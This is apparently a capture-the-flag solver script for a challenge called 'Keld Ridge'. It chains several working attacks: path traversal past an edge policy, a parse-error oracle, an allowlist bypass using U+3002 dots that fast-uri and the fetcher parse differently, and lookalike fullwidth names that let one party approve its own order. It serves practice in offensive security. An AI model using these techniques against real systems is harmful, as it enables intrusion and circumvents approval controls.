#!/usr/bin/env python3
"""Keld Ridge — full solver.

Chain:
  1. edge path-policy bypass      /api/v1/../../ops/<route>
  2. signed order discovery       parse-error oracle on the dispatch target
  3. quarantine bypass            fast-uri 3.1.2 does not fold U+3002, the fetcher does
  4. release unlock               sha256("interlock|<order_id>|<buses joined by comma>")
  5. gateway receipt              POST to <gateway>/dispatch

Usage: python3 solve_keld_final.py http://host:port
"""
import hashlib
import json
import sys
import urllib.error
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "").rstrip("/")
OPS = "/api/v1/../../ops"
PARSE_PROBE = "http:%2f%2fsg-kr.grid.test/"
# U+3002 ideographic full stop: fast-uri leaves it alone, WHATWG maps it to "."
GATEWAY_IDN = "http://sg-kr\u3002grid\u3002test/dispatch"
BUS_SETS = ["KR-B1,KR-B2", "KR-B1", "KR-B2"]


def call(path, payload=None, timeout=10):
    data = json.dumps(payload).encode() if payload is not None else None
    req = urllib.request.Request(
        BASE + path, data=data, method="POST" if data else "GET",
        headers={"Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        return 0, repr(e)


def unlock(order_id, buses):
    return hashlib.sha256(("interlock|%s|%s" % (order_id, buses)).encode()).hexdigest()


def signed_order():
    for n in range(1, 31):
        oid = "ord-%d" % n
        s, b = call(OPS + "/dispatch", {"order_id": oid, "target": PARSE_PROBE,
                                        "unlock": unlock(oid, "KR-B1")})
        if s == 502 and "gateway_unreachable" in b:
            return oid
    return None


def mint_order():
    """Fallback when no signed order is seeded: lookalike delegates + approve."""
    tokens = []
    for name in ("\uff4b.vostra", "a.torv\uff4f"):
        s, b = call(OPS + "/delegates", {"name": name})
        if s not in (200, 201):
            return None
        tokens.append(json.loads(b)["token"])
    s, b = call(OPS + "/orders", {"bus": "KR-B1", "requester_token": tokens[0]})
    if s != 200:
        return None
    oid = json.loads(b)["order_id"]
    s, b = call(OPS + "/orders/approve", {"order_id": oid, "approver_token": tokens[1]})
    if s == 200 and "signed" in b:
        return oid
    return None


def dispatch(oid):
    for buses in BUS_SETS:
        s, b = call(OPS + "/dispatch", {"order_id": oid, "target": GATEWAY_IDN,
                                        "unlock": unlock(oid, buses)})
        print("  %s buses=%-12s %s %s" % (oid, buses, s, b[:240]), flush=True)
        if "CSCTF{" in b:
            return json.loads(b)
        if s == 422:
            # gateway told us the exact unlock input; keep going
            continue
    return None


def main():
    s, b = call("/api/v1/schema")
    print("schema", s, b[:70] if s else b, flush=True)
    if s != 200:
        return
    oid = signed_order()
    if not oid:
        print("no seeded signed order; trying to mint one", flush=True)
        oid = mint_order()
    print("signed order:", oid, flush=True)
    if not oid:
        return
    receipt = dispatch(oid)
    if receipt:
        print("RECEIPT", json.dumps(receipt, indent=2))


if __name__ == "__main__":
    main()
